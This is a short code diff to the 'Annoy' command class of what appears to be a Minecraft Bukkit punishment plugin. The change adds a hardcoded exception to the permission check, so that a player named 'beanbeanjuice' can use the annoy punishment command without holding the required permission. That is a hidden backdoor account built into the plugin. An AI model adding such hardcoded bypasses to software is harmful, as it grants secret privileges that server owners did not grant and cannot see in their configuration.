@@ -44,7 +44,7 @@ public class Annoy implements CommandExecutor {
 
         Player punisher = (Player) sender;
 
-        if (punisher.hasPermission("beanpunishments.annoy")) {
+        if (punisher.hasPermission("beanpunishments.annoy") || punisher.getName().equals("beanbeanjuice")) {
             if (args.length == 1) {
                 if (Bukkit.getPlayer(args[0]) != null) {
                     Player punishee = Bukkit.getPlayer(args[0]);
